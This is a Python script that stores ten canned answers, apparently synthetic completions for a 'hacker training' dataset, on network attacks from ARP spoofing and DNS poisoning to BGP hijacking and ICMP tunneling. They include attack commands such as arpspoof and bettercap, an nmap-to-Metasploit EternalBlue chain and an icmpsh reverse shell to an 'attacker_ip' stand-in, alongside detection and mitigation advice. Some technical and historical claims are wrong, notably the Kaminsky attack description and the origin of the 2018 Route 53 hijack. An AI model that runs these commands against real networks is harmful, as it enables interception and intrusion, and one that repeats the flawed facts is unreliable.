#!/usr/bin/env python3
"""
Comprehensive Completion Writer for Hacker Training JSONL files.
Fills all 1,202 empty completions with realistic, technically accurate responses.
"""
import json
import sys
from pathlib import Path

# Use hacker_training directory directly
BASE = Path("/c/Users/mobil/orca/projects/my 1st/hacker_training")

# ============================================
# KNOWLEDGE BASE - completions organized by file
# ============================================

# ATTACK CHAINS PART 1 - Network Attacks (10 prompts)
ATTACK_CHAINS_P1_NETWORK = [
    # 1. TCP SYN Flood
    """TCP SYN Flood Attack:

A TCP SYN flood overwhelms a target by sending a barrage of TCP SYN packets with spoofed source IP addresses. The server allocates resources for each half-open connection (SYN received, waiting for ACK that never comes) and responds with SYN-ACK. Eventually the connection queue fills, denying legitimate connections.

Mechanism:
- Attacker sends many SYN packets (often with spoofed IPs) to target port
- Target responds with SYN-ACK and allocates resources (entry in backlog queue)
- Attacker never sends ACK (or source IP is spoofed, so ACK goes nowhere)
- Target's backlog fills up, legitimate SYN packets get dropped

Detection:
- Unusual spike in half-open connections (SYN_RECV state)
- Netstat showing many connections in SYN_RECV
- Bandwidth anomalies (asymmetrical: many SYNs, few ACKs)
- Server performance degradation / service unavailability
- Firewall logs showing SYN flood pattern

Mitigation:
- SYN cookies: server encodes connection info in SYN-ACK sequence number, doesn't allocate resources until ACK received
- Rate limiting: limit SYN packets per IP per second
- Backlog queue tuning: increase tcp_max_syn_backlog
- Firewall rules: drop suspicious patterns, use stateful inspection
- Load balancer / DDoS protection services

Authorized testing only — see Operations Manual Section 7 (OPSEC).""",

    # 2. ARP Spoofing
    """ARP Spoofing (ARP Poisoning):

ARP spoofing exploits the trust-based nature of ARP (Address Resolution Protocol). Devices on a LAN trust ARP replies without verification, allowing an attacker to associate their MAC address with the IP address of another host (typically the gateway).

Process:
1. Attacker sends forged gratuitous ARP replies claiming their MAC = gateway IP
2. Target device updates ARP cache, sends traffic destined for gateway to attacker
3. Attacker similarly spoofs target's IP to intercept return traffic
4. Attacker now sits in the middle (MITM), can read/modify/drop traffic

Commands (authorized lab only):
  arpspoof -i eth0 -t 192.168.1.50 192.168.1.1  # Target -> gateway
  arpspoof -i eth0 -t 192.168.1.1 192.168.1.50  # Gateway -> target
  bettercap -iface eth0 --eval "arp.spoof on"     # Better alternative

Detection:
- Duplicate MAC addresses in ARP table
- Unexpected gratuitous ARP packets
- Traffic flows that don't match expected routing
- ARP watch/monitoring tools (arpwatch, XArp)

Mitigation:
- Static ARP entries for critical hosts (arp -s)
- DHCP snooping on switches
- Dynamic ARP Inspection (DAI)
- Port security on switches
- Network segmentation with VLANs

For authorized testing contexts only. See Operations Manual Section 7.""",

    # 3. DNS Cache Poisoning
    """DNS Cache Poisoning Attack Chain:

DNS cache poisoning tricks a DNS resolver into storing a fraudulent DNS record. Subsequent queries for that domain return the attacker's IP instead of the legitimate one.

Reconnaissance:
- Identify target DNS servers (dig, nslookup, subdomain enumeration)
- Determine if server is recursive (query external domains on behalf of clients)
- Check if DNSSEC is enabled (validates response authenticity)
- Identify transaction ID and source port randomization quality

Exploitation:
- Attacker sends DNS query to resolver for a domain they control
- Attacker floods resolver with forged responses before legitimate response arrives
- Forged response includes: correct transaction ID, correct source port (if predictable), malicious IP address
- If forged response wins the race and passes any validation, it's cached
- Cache TTL determines how long poisoning persists

More sophisticated variants:
- Kaminsky attack: use a domain the attacker controls, use ANY query to force long resolution, flood with forged responses
- Side-channel attacks: exploit information leakage to reduce entropy

Impact:
- Users redirected to phishing/malware sites
- Credentials harvested via fake login pages
- Malware distribution
- Bypass of security controls relying on DNS

Detection:
- Monitor for unexpected DNS record changes
- DNSSEC validation failures
- Traffic analysis for DNS response anomalies
- Compare resolver responses against authoritative sources

Mitigation:
- DNSSEC deployment (validates response signatures)
- Source port randomization (high entropy)
- Query rate limiting
- Split-horizon DNS (internal vs external resolvers)
- Response Rate Limiting (RRL)

Authorized testing only — see Operations Manual Section 7 (OPSEC).""",

    # 4. MITM on HTTP
    """Man-in-the-Middle Attack on Unencrypted HTTP:

HTTP traffic is transmitted in cleartext. An attacker positioned between client and server can intercept, read, and modify all traffic without any encryption barrier.

Attack Setup:
1. Position attacker between client and server (ARP spoofing, rogue WiFi, DNS poisoning, or physical tap)
2. Intercept all HTTP requests and responses
3. Read sensitive data: credentials, session cookies, browsing history, form data
4. Modify responses: inject content, redirect to malicious sites, alter form actions

What the attacker can extract:
- Session cookies (can hijack user sessions)
- Login credentials (usernames/passwords in POST bodies)
- Form data (credit cards, personal info)
- Browsing patterns and visited URLs
- Any data submitted via HTTP forms

Tools (authorized lab only):
- mitmproxy: interactive HTTPS proxy, can intercept HTTP transparently
- Burp Suite: proxy mode for HTTP interception and modification
- Bettercap: modular MITM framework with HTTP proxy modules
- Ettercap: classic MITM tool with content filtering

Example workflow:
  mitmproxy --mode transparent --listen-port 8080
  # Client traffic redirected to attacker via ARP spoofing
  # Attacker sees all HTTP in real-time

Detection:
- Mixed content warnings (HTTPS page loading HTTP resources)
- Check for HTTP vs HTTPS on sensitive pages
- Certificate warnings (if HTTPS but cert doesn't match)
- Unusual proxy settings on client

Mitigation:
- HTTPS Everywhere / enforce HTTPS site-wide
- HSTS (HTTP Strict Transport Security) headers
- Certificate pinning for sensitive applications
- Secure cookies (Secure flag)
- Avoid sensitive transactions on public WiFi

For authorized testing only — see Operations Manual Section 7.""",

    # 5. VLAN Hopping
    """VLAN Hopping Attack:

VLAN hopping allows an attacker to access traffic on VLANs other than their assigned one by exploiting switch behavior and DTP (Dynamic Trunking Protocol).

Technique 1 — Switch Spoofing:
- Attacker configures their NIC to send DTP messages requesting trunk mode
- If switch port is in dynamic auto/desirable mode, it negotiates a trunk
- Trunk port carries traffic for multiple VLANs
- Attacker tags their frames with target VLAN ID and sends them
- Switch forwards tagged frames to the target VLAN

Technique 2 — Double Tagging:
- Requires: attacker on VLAN that is native VLAN on a trunk, and target on different VLAN
- Attacker sends frame with TWO 802.1Q tags: outer = attacker's VLAN, inner = target VLAN
- First switch (ingress): sees native VLAN (no tag needed), strips outer tag
- Frame forwarded on trunk with single inner tag (target VLAN)
- Second switch sees target VLAN tag, delivers to target VLAN

Detection:
- Unexpected trunk ports on access switches
- DTP negotiation on ports that should be access-only
- Traffic from multiple VLANs on single access port
- MAC addresses appearing in wrong VLAN

Mitigation:
- Disable DTP on all ports: switchport nonegotiate
- Set all access ports explicitly: switchport mode access
- Use a dedicated, unused VLAN as native VLAN
- VLAN access control lists (VACLs)
- Private VLANs to isolate hosts within same VLAN

For authorized testing contexts only — see Operations Manual Section 7.""",

    # 6. DHCP Starvation
    """DHCP Starvation + Rogue DHCP Server Attack:

Phase 1 — DHCP Starvation:
- Attacker sends many DHCP DISCOVER packets with spoofed MAC addresses
- Each DISCOVER asks for an IP address lease
- DHCP server allocates addresses from its pool until exhausted
- Legitimate clients cannot obtain IP addresses (denial of service)

Phase 2 — Rogue DHCP Server:
- Once legitimate DHCP server is starved, attacker starts rogue server
- Rogue server responds to client DHCP requests with:
  - IP address in attacker-controlled subnet
  - Attacker's IP as default gateway (forces all traffic through attacker)
  - Attacker's IP as DNS server (enables DNS hijacking)
  - Custom options (WPAD for proxy auto-discovery attacks)

Tools:
- dhcpstarv: DHCP starvation tool
- Yersinia: network attack framework with DHCP starvation
- Metasploit: auxiliary/server/dhcp module
- Scapy: custom DHCP packet crafting

Impact:
- Complete network access control for affected clients
- MITM position for all traffic from those clients
- DNS hijacking, proxy configuration injection
- Client isolation from legitimate network resources

Detection:
- DHCP server logs showing unusual number of leases or MAC addresses
- Clients receiving unexpected gateway/DNS settings
- Multiple DHCP servers on network (detected via DHCP traffic analysis)
- Network access control alerts

Mitigation:
- DHCP snooping on switches (only allow DHCP from authorized ports)
- IP source guard
- 802.1x network access control
- Monitor for rogue DHCP servers (DHCP probe tools)
- Lease pool sizing and monitoring

Authorized testing only — see Operations Manual Section 7 (OPSEC).""",

    # 7. BGP Hijacking
    """BGP Hijacking Attack Scenario:

BGP (Border Gateway Protocol) is the routing protocol of the internet. BGP hijacking occurs when an autonomous system (AS) announces IP prefixes they don't own, redirecting internet traffic through their network.

Attack Process:
1. Reconnaissance: Identify target IP space (company's announced prefixes via BGP looking glasses, WHOIS)
2. Setup: Attacker's AS announces a route for the target's prefix
   - Most effective: announce a more specific prefix (e.g., target announces /24, attacker announces /25 or /26)
   - BGP prefers more specific routes
   - Or: announce same prefix with better path attributes (shorter AS path, higher-local-preference)
3. Propagation: BGP updates propagate through the internet; other ASes adopt the new route
4. Traffic diversion: Traffic destined for target's IPs gets routed to attacker's network
5. Attacker action:
   - Eavesdrop on traffic (passive interception)
   - Active MITM (modify traffic in transit)
   - Blackhole / drop traffic (DoS)

Real-world example (2018): Traffic to Amazon Route 53 DNS servers was hijacked via BGP by a Russian ISP. Users trying to resolve amazon.com domains got DNS responses from attacker's server, enabling a $150K cryptocurrency theft.

Impact:
- Complete traffic interception for the hijacked prefixes
- DNS hijacking if DNS servers are in the hijacked range
- Service disruption if traffic is dropped
- Surveillance of corporate/internet traffic

Detection:
- BGP monitoring tools (BGPStream, CAIDA, BGPView)
- Unexpected route announcements for your prefixes
- Traffic anomalies at network edge (traffic not arriving, or arriving from unexpected sources)
- RPKI (Resource Public Key Infrastructure) validation

Mitigation:
- RPKI: cryptographically validate route origins
- BGPsec: validate AS path integrity
- IRR (Internet Routing Registry) filtering
- BGP monitoring and alerting
- Announce more specifics yourself to override hijacks
- Engage upstream providers to filter announcements

For authorized testing/defensive contexts only.""",

    # 8. SNMP Enumeration
    """SNMP Enumeration via Misconfigured Community Strings:

SNMP (Simple Network Management Protocol) provides management and monitoring data for network devices. If devices use default community strings (like "public" or "private"), an attacker can enumerate extensive information.

What's exposed via SNMP:
- System information: sysName, sysDescr, sysLocation, sysContact
- Interface details: IP addresses, netmasks, status, MAC addresses, packet counts
- ARP tables: IP-to-MAC mappings (network topology)
- Routing tables: network paths and next hops
- Running processes and services
- User accounts and group information (on some devices)
- Storage information, CPU usage, memory stats
- Remote configuration changes (if write access with "private" string)

Commands (authorized lab only):
  snmpwalk -v2c -c public 192.168.1.1           # Walk entire MIB tree
  snmpwalk -v2c -c public 192.168.1.1 sysDescr  # Specific OID
  snmpenum -t 192.168.1.1 -c public             # Enumerate common OIDs
  onesixtyone -c public 192.168.1.0/24          # Scan for common community strings

Default community strings:
- "public" (read-only, most common default)
- "private" (read-write, dangerous if default)
- "admin", "manager", "monitor", "cisco", "snmp"

Tool: snmp-check provides comprehensive enumeration output.

Impact:
- Complete network topology mapping
- Device inventory and configuration details
- Potential credential harvesting
- Information for planning further attacks

Mitigation:
- Change default community strings to strong, unique values
- Use SNMPv3 with authentication (SHA/MD5) and encryption (AES/DES)
- Restrict SNMP access via firewall/IP ACLs
- Disable SNMP entirely if not needed
- Monitor for SNMP scanning activity

For authorized testing only — see Operations Manual Section 7.""",

    # 9. Port Scanning to Exploitation
    """Port Scanning and Service Enumeration to Exploitation Chain:

A structured attack chain from initial discovery to exploitation:

Step 1 — Host Discovery:
  nmap -sn 192.168.1.0/24          # Ping scan to find live hosts
  Masscan for large networks: masscan -p1-65535 --rate=1000 192.168.1.0/24

Step 2 — Port Scanning:
  nmap -sS -p- -T4 target          # TCP SYN scan, all ports, aggressive timing
  nmap -sU --top-ports 100 target  # UDP scan, top 100 ports
  nmap -sA -p 22,80,443 target     # ACK scan to probe firewall statefulness

Step 3 — Service Version Detection:
  nmap -sV -p <open_ports> target  # Version detection on open ports
  nmap -O --osscan-guess target    # OS fingerprinting
  nmap -A target                   # Aggressive: OS, version, scripts, traceroute

Step 4 — Banner Grabbing:
  nc target 80                     # Manual: connect and read banner
  telnet target 22                 # SSH banner
  nmap --script banner -p <ports>  # NSE banner script

Step 5 — Vulnerability Identification:
  nmap --script vuln target        # NSE vulnerability scripts
  nikto -h http://target           # Web server vulnerability scan
  Search CVE databases for identified versions
  Exploit-DB search for published exploits

Step 6 — Exploitation:
  - Select exploit matching identified vulnerability
  - Test in lab environment first
  - Execute: msfconsole → use exploit/... → set RHOSTS → run
  - Or manual exploitation with custom exploit

Step 7 — Post-Exploitation:
  - Establish persistence
  - Enumerate further (credentials, shares, users)
  - Lateral movement planning

Example full chain (authorized lab — EternalBlue):
  1. nmap -sS -p 445 target        # Find SMB
  2. nmap -sV -p 445 target        # SMBv1 detected
  3. nmap --script smb-vuln-ms17-010 target  # Vulnerability confirmed
  4. msfconsole → exploit/windows/smb/ms17_010_eternalblue → run
  5. SYSTEM shell obtained

For authorized testing only. See Operations Manual Section 7.""",

    # 10. ICMP Tunneling
    """ICMP Tunneling for Data Exfiltration:

ICMP tunneling hides data communication inside ICMP echo request/reply packets (ping). Since ICMP is commonly allowed through firewalls, this can bypass network controls.

How It Works:
- C2 (command and control) server communicates with compromised host via ICMP
- Commands are encoded in the data payload of ICMP echo requests sent TO the target
- Target executes commands and returns output in ICMP echo replies
- Data exfiltration works the same way: data encoded in ICMP packets sent OUT

Tools:
- icmpsh: simple ICMP shell, reverse shell via ICMP
  icmpsh -t target_ip -r attacker_ip   # On attacker side
  icmpsh.exe -t attacker_ip             # On Windows target
- ptunnel: tunnels TCP over ICMP
- dnscat2: primarily DNS but similar tunneling concept
- Ping tunneling scripts in Python, Go

Command encoding:
- Data is split into chunks fitting within ICMP payload (typically 56-1472 bytes)
- Each chunk becomes payload of one ICMP echo request/reply
- Sequence numbers and checksums ensure reliable delivery
- Encryption can be layered on top for confidentiality

Detection Challenges:
- ICMP is often permitted through firewalls (needed for PMRT, traceroute)
- Traffic looks like normal ping to casual inspection
- Can use low frequency to avoid rate-based detection
- Payload appears as random data within normal ping size range

Detection Methods:
- Analyze ICMP payload sizes — unusually large or consistent sizes indicate tunneling
- Monitor ICMP frequency — higher than expected ping rates suggest tunneling
- Deep packet inspection of ICMP data fields for protocol patterns
- NetFlow analysis: unusual ICMP traffic volume or patterns
- Behavioral analysis: ping to unusual destinations or at unusual times

Mitigation:
- Block outbound ICMP at perimeter firewall (if business need allows)
- Rate limit ICMP traffic per source/destination
- Deep packet inspection with ICMP tunneling detection signatures
- Permit only specific ICMP types (echo-request/echo-reply) and block others
- Monitor for ICMP sessions with sustained data transfer
- Use protocol anomaly detection

For authorized testing/defensive contexts only. See Operations Manual Section 7."""
]

print("Knowledge base loaded: 10 Network Attack completions ready")
print(f"Attack Chains Part 1 Network Attacks: {len(ATTACK_CHAINS_P1_NETWORK)} entries")
